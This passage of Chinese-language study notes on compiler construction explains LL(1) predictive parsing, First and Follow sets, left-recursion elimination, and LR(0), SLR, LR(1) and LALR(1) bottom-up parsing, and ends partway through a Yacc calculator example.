title="LL(1)和预测分析法"></a>LL(1)和预测分析法</h3><p>预测分析法(Predictive parsing)：接受LL(k)文法</p><ul><li>第一个L: “left to right” 从左到右扫描</li><li>第二个L: “left-most derivation” 最左推导</li><li>k: 向前看k个token确定推导选用的产生式（一般不明确说k就是k&#x3D;1）</li></ul><p>接下来需要添加约束使其无需回溯。我们先引入几个概念：</p><ul><li><p>First集和Follow集</p><p>给定 $ G&#x3D;(T,N,P,S),\alpha \in (T\cup N)^* $<br><strong>记空串为$\epsilon$</strong></p><ul><li><p>First集：可从$\alpha$推导得到的串的首个终结符的集合（也就是说，$\alpha$自己推导出的第一个终结符可能是什么）<br>$$ \text{First}(\alpha)&#x3D;{a| \alpha \Rightarrow^*a…\ ,a\in T} $$</p></li><li><p>Follow集：从S出发，可能在推导过程中跟在A右边的终结符号集<br>$$ \text{Follow}(A)&#x3D;{a|S\Rightarrow^*…Aa…\ ,a\in T} $$</p><ul><li>例如: $ S\rightarrow \alpha\ A a\ \beta $，终结符号 $ a\in \text{Follow}(A) $ （仔细区分a和α）</li></ul></li></ul><p>至此可以使用两个条件保证产生式的选择是唯一的：<br>对于产生式 $ A\rightarrow \alpha|\beta $ ,</p><ol><li>$ \text{First}(\alpha)\cap \text{First}(\beta)&#x3D; \emptyset $ （α和β推导不出以同一个单词为首的串）<ul><li>意义：显然的。这样看终结符是哪个就知道应该用哪个产生式。</li></ul></li><li>若$\beta \Rightarrow^* \epsilon$，那么$\alpha \nRightarrow^* \epsilon$，且 $ \text{First}(\alpha) \cap Follow(A) &#x3D; \emptyset $ （α和β不能同时推出$\epsilon$;First(α)不应在Follow(A) 中）<ul><li>意义：其实就是考虑如果可以推导出空串时，后继终结符因为是空串所以暂时还没法确定，得从Follow集中寻找（再向后看），最终做出哪个产生式的选择。</li><li>在<strong>满足这条要求的情况下</strong>，假设下一个输入是b,且$\beta \Rightarrow^* \epsilon$<ul><li>如果b∈First(α)，则选择A → α(属于上面1的情况)</li><li>如果b∈Follow(A)，则选择A → β ,这对应A最终到达了$\epsilon$而且后面紧跟着终结符b的情况</li></ul></li></ul></li></ol><p><strong>应试建议：直接列出LL(1)分析表并检查是否有<em>冲突</em>（见下文）。</strong></p></li></ul><p>接下来我们会看到具体的LL(1)预测分析实现方式。<br><strong>三步走：计算First,Follow-&gt;构造预测分析表-&gt;预测分析</strong></p><ol><li><p>计算First, Follow</p><ul><li><p>Nullable集<br>  由于刚刚提到了空串，我们需要引入一个简单的新定义：Nullable集&#x3D;{可推导出空串的符号}。<br>  定义是递归的：</p><ul><li>Base Case: 如果有产生式 $ X\rightarrow \epsilon$, 那么X当然是Nullable的</li><li>Inductive Case: 如果有产生式 $ X\rightarrow Y_1 Y_2 Y_3 … Y_n$, 且 $Y_1,Y_2,Y_3,…,Y_n$<strong>每个都能</strong>推导出空串，则X是Nullable的</li><li>对于每个产生式，我们可以循环用它们不断更新Nullable集直到不动点。这同样适用于First集与Follow集。</li></ul></li><li><p>First集：</p><ul><li>Base Case: 如果X是终结符terminal: First(X)&#x3D;{X}</li><li>Inductive Case: 如果有产生式 $ X\rightarrow Y_1 Y_2 Y_3 … Y_n$<ul><li>首先，$\text{First}(X) \cup &#x3D; \text{First}(Y_1)$ ($ a\cup &#x3D; b$意为$ a \leftarrow a\cup b$，也就是把b并进a里)</li><li>如果$Y_1 \in \text{Nullable}: $$\text{First}(X) \cup &#x3D; \text{First}(Y_2)$</li><li>如果$Y_1,Y_2 \in \text{Nullable}: $$\text{First}(X) \cup &#x3D; \text{First}(Y_3)$</li><li>…</li><li>直到某个$Y_i \notin \text{Nullable}$则停止</li></ul></li><li>对于每个产生式，我们可以循环用它们不断更新First集直到不动点。</li></ul></li><li><p>Follow集：</p><ul><li>Base Case: $ \text{Follow}(A)&#x3D;\emptyset $</li><li>Inductive Case: 如果有产生式 $ B\rightarrow s_1 A\ s_2 $<ul><li>$\text{Follow}(A) \cup &#x3D; \text{First}(s_2)$</li><li>如果$s_2 \in \text{Nullable}$, $\text{Follow}(A) \cup &#x3D; \text{Follow}(B)$</li></ul></li><li>对于每个产生式，我们可以循环用它们不断更新Follow集直到不动点。</li></ul></li></ul><p> Tips(不要求掌握):Tiger book algorithm 3.13指出他们可以同时计算，感兴趣可以看看。</p></li><li><p>构造预测分析表</p><ul><li><p><del>打开网站即可<a href="https://jsmachines.sourceforge.net/machines/ll1.html">LL(1) Parser Generator</a></del> 不过这个网站确实对于理解第三步中PDA相关过程很有帮助。</p></li><li><p>回顾自顶向下推导的两个选择题：</p><ul><li>Q: 替换当前句型中的哪个非终结符? A: “Left-most”一词说明：总是选择每个句型的最左非终结符进行替换。</li><li>Q: 用该非终结符的哪个产生式进行替换? A: 构建二维表M, 通过当前非终结符和看到的终结符决定选取何种产生式。</li></ul></li><li><p>定义并构造M：</p><ul><li>每一行A对应一个非终结符</li><li>每一列a对应某个终结符或输入结束符<code>$</code></li><li>表中的某一格M[A,a]表示：针对当前非终结符A，下一个输入Token为终结符a时，可选的产生式集合<br><img src="/compiler-construction-principles/tableM.png" alt="M table" loading="lazy"></li><li>构造过程：对于每个产生式 $X\rightarrow \gamma$<ul><li>如果 $ t\in \text{First}(\gamma)$, 插入产生式 $X\rightarrow \gamma$ 到M[X,t]</li><li>如果 $ \gamma \in \text{Nullable} $ 且 $t \in \text{Follow}(X)$, 插入产生式 $X\rightarrow \gamma$ 到M[X,t]</li></ul></li><li><strong>如果某一格存在多个产生式，就说明无法确定选取哪个产生式（也即：产生了<em>冲突</em>），也就说明不是LL(1)文法！</strong></li></ul></li></ul></li><li><p>预测分析</p><ul><li><p>递归下降</p><ul><li>例如对于文法：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">S -&gt; E $</span><br><span class="line">E -&gt; E + T</span><br><span class="line">E -&gt; E – T</span><br><span class="line">E -&gt; T</span><br><span class="line">T -&gt; T * F</span><br><span class="line">T -&gt; T / F</span><br><span class="line">T -&gt; F</span><br><span class="line">F -&gt; id</span><br><span class="line">F -&gt; num</span><br><span class="line">F -&gt; ( E )</span><br></pre></td></tr></table></figure><p>形如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">S</span><span class="params">(<span class="type">void</span>)</span> &#123; E(); eat(EOF); &#125; </span><br><span class="line"><span class="type">void</span> <span class="title function_">E</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="keyword">switch</span>(tok) &#123; </span><br><span class="line">    <span class="keyword">case</span> ?: E(); eat(PLUS); T(); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> ?: E(); eat(MINUS); T(); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> ?: T(); <span class="keyword">break</span>; </span><br><span class="line">    <span class="keyword">default</span>: error();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 问号处内容由预测分析表M决定，读者有兴趣可以帮忙验证一下这个文法是否LL(1)</span></span><br></pre></td></tr></table></figure></li><li><p>非递归下降（<strong>无需掌握</strong>）</p><ul><li>本质上还是递归下降，只是改写成Pushdown Automata所以相当于模拟一个栈</li><li>如果栈顶是非终结符A：利用预测分析表,选择产生式A -&gt; a（也就是将栈顶的非终结符A替换成串a）</li><li>如果栈顶是终结符a：将栈顶记号a和输入中的Token匹配并出栈</li><li>初态：压入初始符号</li><li>终态：输入读取完毕，栈空，此时接受</li></ul></li></ul></li></ol><h3 id="消除左递归、提左公因子"><a href="#消除左递归、提左公因子" class="headerlink" title="消除左递归、提左公因子"></a>消除左递归、提左公因子</h3><ol><li><p>LL(1)文法的部分性质<br>可用于判定问题。</p><ul><li>LL(1)文法是无二义的</li><li>LL(1)文法是无左递归的</li><li>LL(1)文法是无左公因子的</li></ul></li><li><p>左递归(left-recursive)文法:</p><ul><li><p>有非终结符A使得 $A \Rightarrow^* A\alpha$</p></li><li><p>形如 $S\rightarrow Sa$ 的称为直接&#x2F;立即左递归</p></li><li><p>问题：这会导致递归下降分析进入无限循环</p><ul><li>$S\rightarrow Sa|b$ 分析 $baaaa$</li><li>可能永远卡在”a”里而没机会考虑”b”: $ S \Rightarrow Sa \Rightarrow Saa \Rightarrow Saaa \Rightarrow Saaaa …$</li></ul></li><li><p>解决办法：通过文法变换消除（详见龙书）<br>比如可以将这一文法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A -&gt; A a | b (a,b不以A开头，a不为空)</span><br></pre></td></tr></table></figure><p>转为右递归：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A -&gt; b A&#x27;</span><br><span class="line">A&#x27; -&gt; aA&#x27; | ε</span><br></pre></td></tr></table></figure></li></ul></li><li><p>左公因子的(left-factored)文法:</p><ul><li>$ P \rightarrow \alpha \beta | \alpha \gamma$</li><li>问题：同一非终结符的多个候选式存在共同前缀，可能导致回溯</li><li>解决办法：限制文法 或 文法变换<ul><li>例如可以提取左公因子来“推迟决定”，这样可以在读入更多token后进行决策：<br> 把<br> $$ P \rightarrow \alpha \beta | \alpha \gamma $$<br> 变换为<br> $$ P \rightarrow \alpha Q \\ Q \rightarrow \beta | \gamma $$</li></ul></li></ul></li></ol><h3 id="错误恢复"><a href="#错误恢复" class="headerlink" title="错误恢复"></a>错误恢复</h3><p>错误：表M中对应格是空格，没有任何可取的产生式<br>我们不希望遇到错误直接全盘放弃，而是令Parser报错后，尽可能从错误中恢复并继续工作，这样可以一次性尽可能报出程序里全部错误。</p><p>可以通过以下几种方式恢复：</p><ul><li>删除：例如，可以一直跳过token直到遇到当前非终结符对应Follow集中的token</li><li>插入：例如，如果左右括号不匹配，我们可以插入一个括号，暂时假装它是匹配的</li><li>替换：例如，变量名错误可以替换为最相近的变量名</li></ul><p>我们之后会细讲错误恢复的策略。</p><h2 id="Part-5-语法分析-自底向上"><a href="#Part-5-语法分析-自底向上" class="headerlink" title="Part 5: 语法分析 - 自底向上"></a>Part 5: 语法分析 - 自底向上</h2><p>从串w归约为文法开始符号S的过程。规约时，一个与某产生式体<strong>相匹配的特定子串</strong>被替换为该产生式头部的<strong>非终结符号</strong>。</p><p>问题：</p><ul><li>何时归约(归约哪些符号串)？</li><li>归约到哪个非终结符号？</li></ul><p>回顾LL(1)的优势劣势：</p><ul><li>+ 运行高效(线性时间)</li><li>+ 递归实现符合文法结构、适合手动构造&amp;自动生成</li><li>- 能分析的文法类型受限</li></ul><p>我们提出新文法：LR(k)</p><ul><li>表达力: Every LL(k) grammar is also LR(k)</li><li>不要求无左公因式</li><li>可以处理左递归文法</li><li>被广泛采用(Yacc, Bison, …)</li><li>“L”: left-to-right scanning 自左向右扫描</li><li>“R”: right-most derivation in reverse 最右推导的逆</li><li>“k”: 向前看的字符的个数(k省略时取1)</li><li>子集（详见<a href="#grammars-set">该图</a>）：LR(1), LALR(1), SLR, LR(0), …</li></ul><h3 id="移进-规约-Shift-Reduce"><a href="#移进-规约-Shift-Reduce" class="headerlink" title="移进-规约 Shift-Reduce"></a>移进-规约 Shift-Reduce</h3><p><strong>这是LR(k) Parsing 的一般模式。</strong></p><p>核心思想：将字符串一分为二，</p><ul><li>右侧是未被parser检查过的</li><li>左侧包含终结符与非终结符<br>我们接下来会使用”|”标记分割点。</li></ul><p>例如，考虑该文法： $ E \rightarrow E+(E) | \text{int} $</p><ul><li>显然并非LL(1)的：存在左递归</li></ul><p>我们考虑处理字符串”int+(int)+(int)”，则过程如下：<br><img src="/compiler-construction-principles/sr.png" alt="shift reduce" loading="lazy"></p><p>可见LR分析采用最右推导的<strong>逆过程</strong>：最左规约。因此LR分析的每一步都是最右句型。<br>一般实现方式：采用<strong>栈</strong>进行Shift-Reduce</p><ul><li>栈：包含左侧字符串</li><li>输入流：包含剩余未处理的右侧字符串</li><li>操作：<ul><li>Shift: 从输入读入一个Terminal压入栈</li><li>Reduce: 栈顶的几个元素满足某条产生式的<strong>RHS(Right hand side)</strong>, 则pop这些元素并压入产生式的<strong>LHS(Left hand side)</strong></li><li>Error: 爆！留待后文讨论。</li><li>Accept: shift “$” 并且栈中只剩下文法的开始符号</li></ul></li><li>需要解决的问题：<strong>何时shift? 何时reduce?</strong><ul><li>表驱动的LR分析：类似LL文法的表，但行列意义不同，且这个表一般很大（详见后文）</li></ul></li></ul><p>几个文法的包含关系（仍然是详见<a href="#grammars-set">该图</a>）:<br>$ LR(0) \in SLR(1) \in LALR(1) \in LR(1) $</p><h3 id="LR-0-Parsing"><a href="#LR-0-Parsing" class="headerlink" title="LR(0) Parsing"></a>LR(0) Parsing</h3><p>核心思想：因为需要凑出产生式RHS，维护栈顶内容对于所有产生式右侧的“进度”。<br>项(Item):&#x3D; 一个产生式加上在其中某处的一个点。</p><p>例如产生式 $A\rightarrow XYZ$ 有4个Item:</p><ul><li>$A\rightarrow \bullet XYZ $</li><li>$A\rightarrow X\bullet YZ $</li><li>$A\rightarrow XY\bullet Z $</li><li>$A\rightarrow XYZ \bullet $</li></ul><p>Item的含义：</p><ul><li>$ A\rightarrow \alpha \bullet \beta$: 已扫描&#x2F;归约到了α，并期望在接下来的输入中经过扫描&#x2F;归约得到β，然后把αβ归约到A</li><li>$ A\rightarrow \alpha \beta \bullet$: 已扫描&#x2F;归约得到了αβ，此时已经可以把αβ归约为A</li></ul><p><strong>Item类似一个有穷自动机的状态!</strong></p><ul><li>一个项读入一个符号后可以转变为另一个项：例如$A\rightarrow \bullet XYZ $ 读入X就可以转为 $A\rightarrow X\bullet YZ $</li><li>显然项的数量是有限的。</li><li>这样的有穷自动机被称为<strong>LR(0)自动机</strong>。</li></ul><p>LR(0)Parsing的NFA:</p><blockquote><p>⚠ NFA只能识别正则语言RE，然而RE&lt;LR(0). 所以这里的NFA只是用于辅助记录栈顶识别进度。</p></blockquote><ul><li>新增开始符号S’，并加入产生式” S’-&gt;S$ “</li><li>NFA起始状态：$S’\rightarrow \bullet S$ $</li><li>NFA终结状态：$S’\rightarrow S\bullet$ $</li><li>转移：<ul><li>$A\rightarrow \bullet XY $ 读入X就可以转为 $A\rightarrow X\bullet Y $</li><li>对于产生式 $ X\rightarrow \alpha Y \beta $ 与 $Y\rightarrow \gamma$ 那么 $ X\rightarrow \alpha \bullet Y \beta $ 可以直接转换（ε-move）到 $ Y \rightarrow \bullet \gamma$ （相当于递归下降法里进入下一层递归，从而分析当前产生式内部的非终结符）</li></ul></li></ul><p>我们更希望能转为DFA. 当然可以使用子集构造法转换，但事实上可以直接构造DFA.<br><img src="/compiler-construction-principles/lr-nfa2dfa.png" alt="lr-nfa2dfa" loading="lazy"></p><p>LR(0)Parsing的DFA与分析表：</p><ul><li><p>DFA构造：</p><ul><li><p>项集闭包CLOSURE:&#x3D; a <strong>set</strong> of <strong>items</strong>, 记为I</p></li><li><p>任意符号记为X</p></li><li><p>对任意项集Closure(I)求法（其实就是ε-closure）：<br>Closure(I) &#x3D;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">repeat</span><br><span class="line">  for any item A→ α•Xβ in I</span><br><span class="line">    for any production X→ γ</span><br><span class="line">      I ← I + &#123;X→ •γ&#125; </span><br><span class="line">until I does not change. </span><br><span class="line">return I</span><br></pre></td></tr></table></figure><blockquote><p>TL;DR: 如果”·”的右边是非终结符X，就把X为LHS的产生式对应的初始项加入。注意这是递归的：加入的新初始项如果也有这个情况还得接着加。</p></blockquote></li><li><p>接下来的构造方式通过类比NFA-&gt;DFA的子集构造法是显然的：<br>GOTO(I,X):&#x3D; I是一个项集，X是一个文法符号，则GOTO(I,X)定义为I中所有形如 $A\rightarrow \bullet X \beta$ 的项所对应的新项 $A\rightarrow X \bullet \beta$ 构成的新集合生成的闭包（I是状态，X是转移，I里符合要求（也就是下一个符号是X）的产生式前移一位越过X加入转移到的新状态，不符合的被丢弃；当然考虑到ε-moves要再求一遍新状态的闭包）<br><img src="/compiler-construction-principles/lr-dfa.png" alt="lr-dfa" loading="lazy"><br><img src="/compiler-construction-principles/lr-dfa-eg.png" alt="lr-dfa example" loading="lazy"></p></li></ul></li><li><p>DFA到分析表<br>分析表T类似LL(1)中的表M，但是行列的含义与内容都发生了很大变化。</p><ul><li><p>Action表项：</p><ul><li>每一行对应一个状态i</li><li>每一列对应一个<strong>终结符t</strong></li><li>表中的一格T[i,t]代表要做的操作action，有以下几种可能：<ul><li>$s_n$ &#x3D; shift n :&#x3D; 从状态i经过<strong>终结符t</strong>转移到状态n. 步骤：<ol><li>从输入流中取一个终结符t压入状态栈</li><li>将n压入状态栈</li></ol></li><li>$r_k$ &#x3D; reduce k :&#x3D; 确定使用第k个产生式进行规约（此时状态i没有出边）。 步骤：<ol><li>弹出状态栈顶的几个状态（数量对应产生式#k的RHS长度）</li><li>符号栈压入产生式#k的LHS，也即一个非终结符X</li><li>查询Goto表（见下文）T[i,X]将对应的下一个状态压入状态栈</li></ol></li><li>accept :&#x3D; 该状态包含 $S’\rightarrow S \bullet $ $, 接受字符串，运行完毕</li></ul></li></ul></li><li><p>Goto表项：</p><ul><li>每一行对应一个状态i</li><li>每一列对应一个<strong>非终结符X</strong></li><li>表中的一格T[i,X]表明经过<strong>非终结符X</strong>下一个状态是什么</li><li>格中的$g_n$ &#x3D; goto n :&#x3D; 从状态i经过<strong>非终结符X</strong>转移到状态n</li></ul></li><li><p><img src="/compiler-construction-principles/dfa2table.png" alt="dfa to table" loading="lazy"></p><blockquote><p>LR实际实现只有状态栈，符号信息可从相应状态中获取</p></blockquote></li><li><p>一个例子：<br><img src="/compiler-construction-principles/lr0-stack-table.png" alt="lr0-stack-table" loading="lazy"></p></li></ul></li></ul><p>如何理解”LR(0)”中的”0”:</p><ul><li>Item中没有Lookahead terminal等信息，不关心后面的token</li><li>是否规约&#x2F;使用何产生式规约完全取决于栈顶状态</li></ul><p><strong>局限性</strong>：由于只要有产生式能规约就立刻规约，很容易产生冲突（也就是表中一格有多个$s_n$,$r_n$，不知道应该直接规约还是需要接受更多符号来完成另一个产生式，这被称作<strong>shift-reduce conflict</strong>）<br>我们引入新的文法，放宽一些限制。</p><h3 id="SLR-1-Parsing"><a href="#SLR-1-Parsing" class="headerlink" title="SLR(1) Parsing"></a>SLR(1) Parsing</h3><p>SLR(1) &#x3D; Simple LR(1)</p><p>我们说过k省略时默认为1，所以称为SLR文法即可。其实就是LR(0)稍微改改。</p><p>考虑每次规约，都会使用一个产生式 $E\rightarrow \alpha$<br>“LR分析是最右推导的逆过程”，因此每步归约都应该满足：<br>$$ t \in \text{Follow}(E) $$其中t指的是<strong>输入流中下一个token</strong>, E指的是用于<strong>此规约用到的产生式的左部(LHS)</strong>.<br>因此对于SLR文法来说，SLR的DFA和LR(0)一样；但LR(0)的分析表中有一些$r_n$是非法的，需要删去。<br>在生成分析表的具体步骤上：</p><ul><li>LR(0)的某些状态包含可规约的Item，那么这个状态I在对应的Action表中T[I,_]这一行的每一个格子（无论终结符t是什么）无论如何都会有对应的$r_n$项</li><li>SLR会关心后面的终结符是什么，因此如果t不在Follow集中，这不能是一个合法的规约，Action表对应的t列就不会有这个$r_n$</li></ul><p>例如，图中被划去的部分即为从LR(0)分析表到SLR分析表的变化：<br><img src="/compiler-construction-principles/slr-table.png" alt="SLR分析表：删去了部分规约项" loading="lazy"></p><p>规约的条件更严格，也就“自动”消除了一些冲突，也就允许了更多语言被纳入该文法，因此 $\text{LR(0)} \in \text{SLR}$</p><p><strong>局限性</strong>：显然不能消除所有shift-reduce冲突。如果产生冲突对应的终结符t恰好在Follow集里，就无法消除。例如考虑如下文法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">S&#x27; -&gt; S $</span><br><span class="line">S -&gt; L = R</span><br><span class="line">S -&gt; R</span><br><span class="line">L -&gt; id</span><br><span class="line">L -&gt; * R</span><br><span class="line">R -&gt; L</span><br></pre></td></tr></table></figure><p>由最后两条规则<code>L -&gt; * R</code> <code>R -&gt; L</code>可以看出Follow(R)与Follow(L)两个集合互相包含，即相等，即Follow(R)&#x3D;Follow(L)<br>然而’&#x3D;’在Follow(L)&#x3D;{<code>=</code>,<code>$</code>}中，因此我们遇到’L&#x3D;…’时仍然不知道应该接受等于号进行shift(这样就可以进一步在<code>S-&gt;L=R</code>这个产生式中前进)，还是直接使用<code>R-&gt;L</code>进行reduce.<br><img src="/compiler-construction-principles/slr-conflict.png" alt="slr-conflict" loading="lazy"><br><img src="/compiler-construction-principles/slr-conflict-table.png" alt="slr-conflict-table" loading="lazy"></p><p>需要更多、更精确的限制才能进一步降低冲突的可能。</p><h3 id="LR-1-Parsing"><a href="#LR-1-Parsing" class="headerlink" title="LR(1) Parsing"></a>LR(1) Parsing</h3><p>包含更多信息（后继token）来消除一些归约动作。<br>相当于“分裂”一些LR(0)状态，精确指明何时应该归约。</p><p><strong>LR(1)项(item)的形式：$ A \rightarrow \alpha \bullet \beta,\ a$</strong></p><p>逗号后的a是 <strong>向前看符号(lookahead symbol)</strong> 即表明向前看一个终结符，可以是<code>$</code>.<br>和LR(0)对比，处理ε-move时记录合法的向前看符号w.</p><p>各种计算：</p><ul><li><p>计算Closure<br>对于状态I中的一个item $$A\rightarrow \alpha \bullet X \beta,\ z$$ 以及一个产生式 $$X\rightarrow \gamma$$<br>我们<strong>递归地</strong>寻找所有 $w\in \text{First}(\beta z)$ 然后加入I：$I\cup&#x3D;{(X\rightarrow \bullet \gamma,\ w) | \forall w\in \text{First}(\beta z) }$（直到不动点为止）<br>起始状态是 $S’\rightarrow \bullet S \$,\ ?$ 的闭包</p><ul><li>我们不关心”?”处是什么，因为永远不会移进<code>$</code>.<br>所以一种可行的表示是把<code>$</code>都移到产生式外部，而非真的要产生一个<code>$</code>符号： $S’\rightarrow \bullet S,\ \$$）<br>或者你也可以直接写作：$S’\rightarrow \bullet S\$,\ ?$ （推荐）</li></ul></li><li><p>计算Goto表<br>基本和LR(0)算法保持相同，移入动作不考虑向前看符号z<br>也就是对于转移X，转移前后项的变换是：<br>$$A \rightarrow \alpha \bullet X \beta,\ z \ \ \Rightarrow\ \ A \rightarrow \alpha X \bullet \beta,\ z$$</p></li><li><p>计算Action表：Reduce操作</p><p>规约操作是变换较大的部分。<br>在LR(1)中，Action表项中Reduce操作形如$(I, z, A\rightarrow \alpha)$</p><ul><li>I: 代表状态I对应的行</li><li>z: 代表向前看符号</li><li>$ A\rightarrow \alpha $ 为规约所采用的产生式<br>这就限制了从某个可规约项规约时，必须向前看一个符号以确保它是lookahead symbol.</li></ul><p><img src="/compiler-construction-principles/lr1-items.png" alt="lr1 items" loading="lazy"></p></li></ul><p><strong>局限性</strong>：这样的文法限制过少，过于灵活，导致状态数量过多，状态表过于庞大。<br><img src="/compiler-construction-principles/lr1-con.png" alt="lr1 con" loading="lazy"><br><img src="/compiler-construction-principles/lr1-dfa.png" alt="lr1 dfa" loading="lazy"></p><blockquote><p>注：话虽如此，文法仍然可能因为R-R冲突与S-R冲突从而导致其不属于LR(1)！这样的例子可以在LR(k)且k&gt;1的文法中大量找到。</p></blockquote><p>因此我们在SLR(1)&#x3D;Simple LR(1)与LR(1)之间折中，可以得到一个新文法LALR(1).</p><h3 id="LALR-1-Parsing"><a href="#LALR-1-Parsing" class="headerlink" title="LALR(1) Parsing"></a>LALR(1) Parsing</h3><p>LALR &#x3D; Look-Ahead LR</p><p>动机：发现很多LR(1)中的状态都只有lookahead symbol的区别。能否合并？</p><p><strong>LALR(1): 把LR(1)中只有lookahead symbol不同的item合并。</strong></p><p>定义：把LR(1)中item的集合里所有lookahead symbol去掉，剩下的称为<strong>核(core)</strong><br>把LR(1)中所有核相同的状态两两合并为一个状态。每次合并都删除两个旧状态，新增一个新状态，入边出边的连接方式是显然的，直接接在新状态上即可。<br>新状态的item是两个旧状态的item的并（其实就是把每个item的lookahead symbol合并一下）。</p><p><img src="/compiler-construction-principles/lr1-lalr1.png" alt="lr1 to lalr1" loading="lazy"></p><p>这样得到的表将会小很多：与SLR的分析表<strong>一样大</strong>！通常状态数只有LR(1)的十分之一。付出的微小代价：规约-规约冲突(reduce-reduce conflict)<br>例如对于如下文法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">S -&gt; a E c</span><br><span class="line">   | a F d</span><br><span class="line">   | b F c</span><br><span class="line">   | b E d</span><br><span class="line">E -&gt; e</span><br><span class="line">F -&gt; e</span><br></pre></td></tr></table></figure><p>在LALR分析表中有两个状态会被合并成一个。而之后的下个字符将会出现歧义。这个冲突对应的状态：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">E -&gt; e, &#123;c,d&#125;</span><br><span class="line">F -&gt; e, &#123;c,d&#125;</span><br></pre></td></tr></table></figure><ul><li>LR(1)分析器：将产生两个不同的状态(图中的状态#6与#9)，不会产生冲突：<img src="/compiler-construction-principles/lr1-eg.png" alt="lr1 example" loading="lazy"></li><li>LALR(1)分析器：只会产生一个状态，产生冲突<ul><li>若下个输入字符为c或d，可以归约成E或F</li></ul></li></ul><p>因此，上述文法对于LALR(1)是二义的。<br>但这是可以接受的：LALR(1)足以处理绝大部分程序设计语言。</p><h2 id="Part-6-语法分析杂项"><a href="#Part-6-语法分析杂项" class="headerlink" title="Part 6: 语法分析杂项"></a>Part 6: 语法分析杂项</h2><h3 id="语法分析器的生成器：YACC"><a href="#语法分析器的生成器：YACC" class="headerlink" title="语法分析器的生成器：YACC"></a>语法分析器的生成器：YACC</h3><p>Yacc &#x3D; yet another compiler-compiler:</p><ul><li>基于LALR(1)</li><li>BNF(Backus Naur Form)范式</li><li>GNU版本名为<em>Bison</em></li><li>流程：<ol><li>Yacc源程序(*.y) &gt;&gt; Yacc Compiler &gt;&gt; C语言实现的LALR分析器(y.tab.c)</li><li>y.tab.c &gt;&gt; C Compiler &gt;&gt; 分析器可执行文件(<em>.exe&#x2F;</em>.out)</li><li>输入 &gt;&gt; 分析器可执行文件 &gt;&gt; 输出</li></ol></li></ul><ol><li><p>Lex</p><ul><li>一种词法分析器的生成器，将词法转化为词法解析器yylex()</li><li>Yacc生成的yyparse()可以接受yylex()进而生成语法分析器</li></ul></li><li><p>Yacc源程序结构</p><ul><li>声明<ul><li>C语言的声明</li><li>词法单元的声明</li></ul></li><li>翻译规则<ul><li>产生式</li><li>产生式相关语义动作（例如编译时计算）</li></ul></li><li>辅助性C语言例程<ul><li>直接拷贝到生成的*.tab.c中</li><li>可以在语义动作中调用</li><li>Lex生成的yylex()就是其中之一，可以返回词法单元</li></ul></li></ul><p> 例如，对于示例文法：</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exp → exp addop term | term</span><br><span class="line">addop → + | -</span><br><span class="line">term → term mulop factor | factor</span><br><span class="line">mulop → *</span><br><span class="line">factor → ( exp ) | number</span><br></pre></td></tr></table></figure><p> 有示例程序：</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;ctype.h&gt;</span><br><span class="line">int yylex(void);</span><br><span class="line">int yyerror (char * s);</span><br><span class="line">%&#125;</span><br><span class="line">%token NUMBER</span><br><span class="line">%%</span><br><span class="line">command: exp &#123;printf(&quot;%d\n&quot;, $1);&#125;;</span><br><span class="line">exp: exp &#x27;+&#x27; term &#123;$$ = $1 + $3;&#125;</span><br><span class="line">  | exp &#x27;-&#x27; term &#123;$$ = $1 - $3;&#125;</span><br><span class="line">  | term &#123;$$ = $1&#125;</span><br><span class="line">;</span><br><span class="line">term: term &#x27;*&#x27; factor &#123;$$ = $1 * $3;&#125;</span><br><span class="line">    | factor &#123;$$ = $1;&#125;</span><br><span class="line">;</span><br><span class="line">factor: NUMBER &#123;$$ = $1;&#125;</span><br><span class="line">      | &#x27;(&#x27; exp &#x27;)&#x27; &#123;$$ = $2;&#125;</span><br><span class="line">;</span><br></pre></td></tr></table></figure><p> 其中翻译规则Rule的格式为 <code>Rule &#123;Action Code&#125;</code>，使用规则规约后Action Code就会被执行<br> 